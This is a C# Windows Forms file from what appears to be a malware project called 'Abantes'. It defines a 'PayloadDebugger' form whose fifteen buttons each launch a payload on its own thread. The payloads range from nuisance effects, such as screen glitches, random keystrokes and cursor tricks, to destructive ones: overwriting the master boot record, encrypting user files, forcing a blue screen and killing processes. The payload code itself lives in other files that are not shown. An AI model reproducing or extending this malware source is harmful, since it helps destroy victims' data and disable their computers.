using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using Abantes.Payloads;
using Abantes.Utils;

namespace Abantes
{
    public partial class PayloadDebugger : Form
    {
        public static int Status;

        public PayloadDebugger()
        {
            InitializeComponent();
            Status = 1;
        }

        private void PayloadDebugger_Load(object sender, EventArgs e)
        {

        }

        ~PayloadDebugger()
        {
            Status = 0;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Thread crazybounce = new Thread(new ThreadStart(Annoying.CrazyBounce));
            crazybounce.Start();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Thread screenscrew = new Thread(new ThreadStart(Annoying.Screen_Screw));
            screenscrew.Start();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Thread mouseTrap = new Thread(new ThreadStart(Annoying.MouseTrap));
            mouseTrap.Start();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Thread cursoricon = new Thread(new ThreadStart(Annoying.CursorIcon));
            cursoricon.Start();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Thread flip = new Thread(new ThreadStart(Annoying.Flip));
            flip.Start();
        }

        private void button6_Click(object sender, EventArgs e)
        {
            Thread text = new Thread(new ThreadStart(Annoying.Text));
            text.Start();
        }

        private void button7_Click(object sender, EventArgs e)
        {
            Thread randomKeyboard = new Thread(new ThreadStart(Annoying.RandomKeyboard));
            randomKeyboard.Start();
        }

        private void button8_Click(object sender, EventArgs e)
        {
            Thread KA = new Thread(new ThreadStart(Destructive.KillAll));
            KA.Start();
            Thread BSOD = new Thread(new ThreadStart(Destructive.FORCE_BSOD));
            BSOD.Start();
        }

        private void button9_Click(object sender, EventArgs e)
        {
            Thread MBR = new Thread(new ThreadStart(Destructive.MBR_Overwrite));
            MBR.Start();
        }

        private void button10_Click(object sender, EventArgs e)
        {
            Thread encrypt = new Thread(new ThreadStart(Destructive.EncryptUserFiles));
            encrypt.Start();
        }

        private void button11_Click(object sender, EventArgs e)
        {
            Thread ejectCD = new Thread(new ThreadStart(Annoying.EjectCd));
            ejectCD.Start();
        }

        private void button12_Click(object sender, EventArgs e)
        {
            Thread drawIcons = new Thread(new ThreadStart(Annoying.Display_Icons));
            drawIcons.Start();
        }

        private void button13_Click(object sender, EventArgs e)
        {
            Thread screenGlitches = new Thread(new ThreadStart(Annoying.Screen_Glitching));
            screenGlitches.Start();
        }

        private void button14_Click(object sender, EventArgs e)
        {
            Thread randomOSSounds = new Thread(new ThreadStart(Annoying.RandomOSSounds));
            randomOSSounds.Start();
        }

        private void button15_Click(object sender, EventArgs e)
        {
            Thread KPC = new Thread(new ThreadStart(Destructive.KillPC));
            KPC.Start();
        }
    }
}
